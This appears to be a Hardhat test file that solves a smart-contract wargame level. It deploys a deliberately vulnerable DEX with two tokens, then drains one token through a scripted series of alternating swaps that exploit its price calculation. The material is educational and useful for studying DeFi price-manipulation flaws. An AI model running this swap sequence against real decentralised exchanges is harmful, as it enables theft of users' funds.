
const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require( "chai" );
const { ethers } = require("hardhat");

describe("Fallback", function () {
    // Deploys the Fallback contract
    async function deployFallback() {
        const [owner, otherAccount] = await ethers.getSigners();
        const Level22 = await hre.ethers.getContractFactory("Dex");
        const level22 = await Level22.deploy();
        await level22.deployed();
        const Token = await hre.ethers.getContractFactory("SwappableToken");
        const token1 = await Token.deploy(level22.address, "token1", "T1", 110);
        await token1.deployed();
        const token2 = await Token.deploy(level22.address, "token2", "T2", 110);
        await token2.deployed();

        level22.connect(owner).setTokens(token1.address, token2.address);

        token1.connect(owner).transfer(otherAccount.address, 10);
        token2.connect(owner).transfer(otherAccount.address, 10);
        token1.connect(owner).transfer(level22.address, 100);
        token2.connect(owner).transfer(level22.address, 100);
        // create 110 of each token, send 10 of each to otherAddress

        console.log(
          `Level22 deployed at address ${level22.address}`
        )
        console.log(
          `Token1 deployed at address ${token1.address}`
        )
        console.log(
          `Token2 deployed at address ${token2.address}`
        )
        return {level22, token1, token2, owner, otherAccount};
    }

    /*
    The goal of this level is for you to hack the basic DEX contract below and steal the 
    funds by price manipulation.

    You will start with 10 tokens of token1 and 10 of token2. The DEX contract starts with 
    100 of each token.

    You will be successful in this level if you manage to drain all of at least 1 of the 2 
    tokens from the contract, and allow the contract to report a "bad" price of the assets.
    */
    describe("Solve", function() {
        it("Should solve level22", async function() {
            const {level22, token1, token2, owner, otherAccount} = await loadFixture(deployFallback);

            // Repeatedly swap all of our tokens of one type for tokens of the other. The exchange
            // rate gets continually skewed in our favor until we can eventually grab all the tokens
            // of one type.
            await level22.connect(otherAccount).approve(level22.address, 1000);
            await level22.connect(otherAccount).swap(token1.address, token2.address, 10);
            await level22.connect(otherAccount).swap(token2.address, token1.address, 20);
            await level22.connect(otherAccount).swap(token1.address, token2.address, 24);
            await level22.connect(otherAccount).swap(token2.address, token1.address, 30);
            await level22.connect(otherAccount).swap(token1.address, token2.address, 41);
            await level22.connect(otherAccount).swap(token2.address, token1.address, 45);

            let token1Balance = await level22.connect(otherAccount).balanceOf(token1.address, level22.address);

            expect (token1Balance).to.eq(0);
        })
    });
});